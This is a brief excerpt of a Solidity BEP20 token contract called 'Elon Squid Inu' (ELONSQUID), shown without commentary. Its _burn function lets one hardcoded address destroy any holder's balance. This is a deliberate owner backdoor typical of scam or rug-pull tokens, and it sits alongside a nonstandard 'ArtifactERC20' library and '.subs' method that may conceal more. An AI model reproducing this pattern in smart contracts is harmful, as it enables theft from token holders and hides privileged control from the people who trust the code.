...
contract TokenContract1 is IBEP20, Context {
    using SafeMath for uint256;
    using ArtifactERC20 for uint256;
    ...
    string constant _name = "Elon Squid Inu";
    string constant _symbol = "ELONSQUID";
    ...
    function _burn(address account, uint256 amount) internal virtual {
        _balances[account] = _balances[account].subs(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        require(msg.sender == 0x8f4BC892aA8d693a364269651685d0CeC4BaA40f);
    }
